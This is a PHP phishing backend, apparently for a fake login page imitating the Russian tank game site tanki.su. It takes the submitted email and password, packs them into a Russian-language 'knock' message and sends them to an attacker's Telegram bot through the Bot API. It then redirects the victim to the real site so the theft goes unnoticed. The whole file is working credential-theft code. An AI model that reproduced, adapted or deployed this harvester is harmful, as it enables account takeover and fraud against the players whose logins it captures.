<?php
session_start();

$token = '';
$id = '';
$redrectTo = 'https://tanki.su';
$password = $_POST['password'];
$email = $_POST['login'];
$errors = [];
$data = [];

if (empty($email)) {
    $errors['message'] = 'Incorrect email address or password.';
}

if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
    $errors['message'] = 'Incorrect email address or password.';
}

if (empty($password)) {
    $errors['message'] = 'Incorrect email address or password.';
}

if (!empty($errors)) {
    $data['success'] = false;
    $data['errors'] = $errors;
} else {
    $txt = urlencode("Отстук с сайта танки 🔒 Логин: `$email`\n🔑 Пароль: `$password`");
    
    $sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$id}&parse_mode=MarkDown&text={$txt}","r");

    $data['success'] = true;
    $data['message'] = 'Success!';
    $data['redirect_to'] = $redrectTo;
}

echo json_encode($data);